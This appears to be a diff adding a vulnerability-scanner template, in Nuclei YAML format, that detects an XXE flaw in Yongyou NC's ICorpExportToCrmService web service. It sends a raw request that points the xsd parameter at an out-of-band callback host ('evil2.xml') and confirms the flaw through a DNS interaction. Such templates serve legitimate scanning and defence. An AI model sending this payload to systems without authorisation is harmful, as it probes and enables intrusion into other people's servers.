@@ -1,0 +1,20 @@
+id: yongyou-icorpexporttocrmservice-xxe
+info:
+  name: Yongyou NC ICorpExportToCrmService XXE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: xxe,dnslog
+  description: |
+    Yongyou NC's ICorpExportToCrmService interface is vulnerable to XML External Entity (XXE) injection, potentially allowing attackers to execute arbitrary external requests.
+
+http:
+  - raw:
+      - |
+        GET /uapws/service/nc.itf.bd.crm.ICorpExportToCrmService?xsd=http://{{interactsh-url}}./evil2.xml HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
